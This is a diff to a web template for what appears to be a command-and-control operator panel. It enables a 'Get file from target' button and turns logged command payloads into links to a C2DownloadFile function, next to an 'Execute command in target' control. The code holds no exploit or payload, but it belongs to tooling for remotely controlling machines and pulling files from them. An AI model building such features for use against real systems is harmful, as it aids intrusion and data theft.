@@ -91,7 +91,7 @@
                         title="Execute command in target">
                         <i class="fa fa-terminal"></i> Execute
                       </a>
-                      <a id="button_get" class="btn btn-app disabled" data-toggle="tooltip" data-placement="top"
+                      <a id="button_get" class="btn btn-app" data-toggle="tooltip" data-placement="top"
                         title="Get file from target">
                         <i class="fa fa-download"></i> Get File
                       </a>
@@ -137,18 +137,26 @@
                           </tr>
                         </thead>
                         <tbody>
-                          {{range .Commands}}
+                          {{ $ctx := . }}
+                          {{ range $i, $t := .Commands }}
                           <tr>
                             <td>
-                              {{ if .Completed }}
+                              {{ if $t.Completed }}
                               <span style="color: green;"><i class="fa fa-check"></i></span>
                               {{ else }}
                               <span style="color: red;"><i class="fa fa-clock-o"></i></span>
                               {{end}}
                             </td>
-                            <td>{{ pastTimeAgo .UpdatedAt}}</td>
+                            <td>{{ pastTimeAgo $t.UpdatedAt}}</td>
                             <td><code>{{ .Action }}</code></td>
-                            <td>{{ .Payload }}</td>
+                            <td>
+                              {{ $payload := payloadFormat $t $ctx.Files }}
+                              {{ if eq $payload $t.Payload }}
+                                {{ $t.Payload }}
+                              {{ else }}
+                                <a href="javascript:C2DownloadFile('{{ $payload }}');">{{ $t.Payload }}</a>
+                              {{ end }}
+                            </td>
                           </tr>
                           {{ end }}
                         </tbody>
